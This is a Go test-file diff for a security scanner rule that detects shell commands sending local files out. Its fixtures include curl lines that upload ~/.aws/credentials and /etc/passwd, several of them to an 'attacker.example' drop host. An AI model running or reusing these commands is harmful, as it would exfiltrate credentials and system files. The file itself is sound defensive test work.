@@ -956,3 +956,56 @@ func TestSD007_UploadFlagBelongsToItsOwnCommand(t *testing.T) {
 		t.Errorf("got %+v, want a security finding", fs)
 	}
 }
+
+// --- PR review, round 5: the demotion stops parsing shell -------------------
+
+func TestSD007_UploadFlagNeedsNoCommandIdentity(t *testing.T) {
+	// Eleven of the twelve defects found in review of this change were about
+	// shell syntax rather than exfiltration: where a command begins, whether
+	// an `&` is a separator or part of a query string, whether the word
+	// "curl" in a comment counts. None of that is what the demotion needs to
+	// know. It needs to know whether the flag's argument is a file.
+	//
+	// `-T` takes a bare path; wget's `-T` takes a number of seconds. Testing
+	// the argument's shape separates them without knowing which command owns
+	// the flag, so the splitting and the command-identity test are gone.
+	upload := map[string]string{
+		"query string before the flag": `curl "https://api.example.com/x?a=1&b=2" -T ~/.aws/credentials`,
+		"plain":                        "curl https://api.example.com/x -T ~/.aws/credentials",
+		"attached":                     "curl -T~/.aws/credentials https://attacker.example/drop",
+		"wrapped":                      "curl -X PUT \\\n  -T ~/.aws/credentials \\\n  https://attacker.example/drop",
+		"absolute path":                "curl --upload-file /etc/passwd https://attacker.example/drop",
+	}
+	for name, stmt := range upload {
+		t.Run(name, func(t *testing.T) {
+			if !exfiltratesLocalData(stmt) {
+				t.Errorf("not treated as sending local state: %s", stmt)
+			}
+		})
+	}
+
+	quiet := map[string]string{
+		"wget timeout":                  "wget -T 30 https://api.example.com/data",
+		"wget timeout, curl in comment": "wget -T 30 https://api.example.com/data  # or use curl",
+		"wget timeout attached":         "wget -T30 -q https://api.example.com/data",
+		"curl after a wget timeout":     "curl https://a.example/x && wget -T 30 https://b.example/y",
+	}
+	for name, stmt := range quiet {
+		t.Run(name, func(t *testing.T) {
+			if exfiltratesLocalData(stmt) {
+				t.Errorf("treated as sending local state: %s", stmt)
+			}
+		})
+	}
+}
+
+func TestSD007_StdinIsNotAFile(t *testing.T) {
+	// `-d @-` reads stdin, usually from a heredoc — it names no file. Found in
+	// the corpus alongside the real `@file` uses.
+	if exfiltratesLocalData("curl -X POST https://api.example.com/x -d @- <<'EOF'") {
+		t.Error("`-d @-` reads stdin, not a file")
+	}
+	if !exfiltratesLocalData("curl -X POST https://api.example.com/x -d @/etc/passwd") {
+		t.Error("`-d @/etc/passwd` is a file")
+	}
+}
